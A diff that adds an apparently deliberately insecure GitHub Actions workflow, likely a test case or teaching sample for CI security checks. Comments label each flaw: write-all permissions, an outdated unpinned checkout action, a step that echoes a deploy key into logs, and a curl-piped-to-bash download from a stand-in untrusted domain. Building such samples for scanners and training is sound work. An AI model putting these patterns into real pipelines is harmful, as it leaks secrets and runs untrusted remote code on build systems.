@@ -1,0 +1,14 @@
+name: Broken Pipeline
+on: [push, pull_request]
+
+permissions: write-all # Overly permissive
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v1 # Outdated / unpinned
+      - name: Leak Secrets
+        run: echo "DEPLOY_KEY=${{ secrets.DEPLOY_KEY }}"
+      - name: Unchecked Script Execution
+        run: curl -sSf https://untrusted-domain.example/install.sh | bash
